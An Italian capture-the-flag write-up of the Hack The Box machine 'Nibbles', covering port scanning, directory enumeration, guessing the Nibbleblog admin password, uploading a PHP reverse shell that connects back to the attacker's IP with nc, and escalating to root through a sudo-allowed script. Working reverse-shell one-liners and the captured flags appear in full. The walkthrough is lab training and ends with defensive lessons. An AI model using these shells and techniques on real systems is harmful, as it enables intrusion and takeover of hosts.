**TARGET:10.10.10.75**

# INFORMATION GATHERING

Lanciamo un primo scan [[Nmap]] per vedere quali porte sono aperte e quali servizi girano 

```bash
┌──(root㉿kali)-[/home/kali/htb/nibbles]
└─# nmap -sC -sV -O -Pn 10.10.10.75
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 09:31 EDT
Nmap scan report for 10.10.10.75
Host is up (0.049s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/17%OT=22%CT=1%CU=39939%PV=Y%DS=2%DC=I%G=Y%TM=6464D73
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.65 seconds
```

Un ulteriore scan su tutte le porte non ci da nessuna nuovo risultato

Troviamo 2 porte aperte

[[Port 22 SSH|22]]/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
[[Port 80,443 Web|80]]/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

# ENUMERATION

Visitano la la porta 80 ci troviamo difrotne ad un pagina bianca con scritto solo 
#"Hello world!" porviamo ad ispezionare il codice sorgente

<b>Hello world!</b>
```htlm
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Visitando http://10.10.10.75/nibbleblog/ ci troviamo difornte una sorta di blog, " Powered by Nibbleblog"

Una ricerca su google ci spiega cosa sia Nibbleblog "https://www.nibbleblog.com/it/" è un 
[[Port 80,443 Web#^6b5dc9|CMS]] per la creazioni di blog 

proviamo ad enumerare con [[Gobuster]] per vedere se ci sono directory esposte 

```bash
┌──(root㉿kali)-[/home/kali/htb/nibbles]
└─# gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/17 09:59:01 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
Progress: 1383 / 220561 (0.63%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/05/17 09:59:08 Finished
===============================================================
```

Nel percorso http://10.10.10.75/nibbleblog/README troviamo quelle che sembrano essere informazioni sulla versione di nibbleblog che monta il server
```htlm
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====
* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====
* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory â€œcontentâ€ writable by Apache/PHP

Optionals requirements

* PHP module - Mcrypt
```

Cerchiamo con searchsploit

```bash
┌──(root㉿kali)-[/home/kali/htb/nibbles]
└─# searchsploit nibbleblog
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                  | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                   | php/remote/38489.rb
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

C'è un modulo di metasploit ma voglio prova ed exploitare manualmente 
Una ricerca su google mi porta qui 
https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html

Diverse informazioni importanti sono menzionate nella pagina.
1. È una vulnerabilità legata all'esecuzione di codice [[RCE]]. 
2. La vulnerabilità è nel plug-in "My image" che consente il caricamento di file PHP, quindi ci consentirebbe di caricare una [[Revshell]] PHP.
3. È una vulnerabilità autenticata, il che significa che abbiamo bisogno delle credenziali di amministratore prima di sfruttare questa vulnerabilità.

Come menzionato nella Proof of Concept, la pagina di amministrazione può essere trovata qui.

http://10.10.10.75/nibbleblog/admin.php

Ci tornivamo difronte ad una pagina di login dobbiamo trovare le credenziali, proviamo le credenziali di default:

- admin:admin 
- admin:nibbles 
- nibbles:admin 
- nibbles:nibbles 

se non funziona proverò a cercare online..
Abbiamo fortuna con la coppia 
admin:nibbles  

Seguiamo le istruzioni e ci rechiamo alla sezione my image, carichiamo una revshell.php che salviamo come image.php

```bash
┌──(root㉿kali)-[/home/kali/htb/nibbles]
└─# cat image.php                                                                 
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.53 443 >/tmp/f"); ?>
```

Ci mettiamo in ascolto con nc:

```bash
┌──(root㉿kali)-[/home/kali/htb/nibbles]
└─# nc -lnvp 443           
listening on [any] 443 ...
```

visitiamo la pagina "http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php" che é la path su cui è stata salvata nostra revshell in php e otteniamo una shell

```bash
┌──(root㉿kali)-[/home/kali/htb/nibbles]
└─# nc -lnvp 443           
listening on [any] 443 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.10.75] 50808
/bin/sh: 0: can't access tty; job control turned off
```

Otteniamo la flag user
```bash
$ cat user.txt
edb79d68ee9a9cb406071dea9debd536
```

# PRIVESC

Vediamo con sudo -l se possiamo eseguire qualcosa come root
```bash
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Possiamo eseguire lo script monitor.sh nella directory sopra specificata come root senza dover inserire una password di root. Perché questa è una buona notizia per noi? 
Se chiamiamo una shell in quello script, possiamo eseguirla come root!

```bash
$ cat home/nibbler/personal/stuff/monitor.sh
cat: home/nibbler/personal/stuff/monitor.sh: No such file or directory
```

Non esiste! Dovremo crearne uno, creiamo le cartelle mancanti /personal/stuff 
con echo impostiamo una revshell che salveremo con il nome di monitor.sh
```bash

nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.53 888 > /tmp/f" >> monitor.sh
```

Ci mettiamo in ascolto con nc 
```bash
┌──(root㉿kali)-[/home/kali/htb/nibbles]
└─# nc -lnvp 888
listening on [any] 888 ...
```

Dalla macchina target lanciamo monitor.sh con il comando sudo 

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo ./monitor.sh
```

Otteniamo una shell da root

```bash
┌──(root㉿kali)-[/home/kali/htb/nibbles]
└─# nc -lnvp 888
listening on [any] 888 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.10.75] 60324
whoami
root
```


Flag root
```bash
cat root.txt
8a983562cb7edab06e0b09fd1dcbea55
```

# LESSON LEARNED

Per ottenere un punto d'appoggio iniziale sulla macchina di destinazione abbiamo dovuto eseguire due operazioni:
1. Enumerare bene con gobuter per ottenere più informazioni possibile
2.  indovinare le credenziali dell'amministratore e  sfruttare una vulnerabilità nella versione di Nibbleblog installata. 

L'applicazione utilizzava credenziali di autenticazione deboli, quindi siamo stati in grado di indovinare le credenziali dell'amministratore. 
L'applicazione utilizzava anche il plug-in vulnerabile "My image" che ci consentiva di eseguire una shell inversa sulla nostra macchina di attacco. 
Ciò dimostra l'importanza di imporre l'uso di credenziali di autenticazione forte e di applicare patch al software. 
In questo caso, non sono nemmeno sicuro che sia stata resa disponibile una patch. 
Anche l'applicazione ha raggiunto la fine del suo ciclo di vita, quindi la raccomandazione sarebbe quella di utilizzare altri software per ospitare il tuo blog, o per lo meno rimuovere il plug-in "La mia immagine" in modo che un utente malintenzionato non possa sfruttare questa specifica vulnerabilità.
Per passare ai privilegi di root, ho utilizzato una configurazione di sicurezza che chiaramente non era più necessaria all'utente poiché lo script non è più presente. Questo mi ha permesso di eseguire comandi arbitrari con privilegi di root. L'amministratore di sistema avrebbe dovuto conformarsi al principio del privilegio minimo e non dare a un utente normale la possibilità di eseguire uno script con privilegi di root.

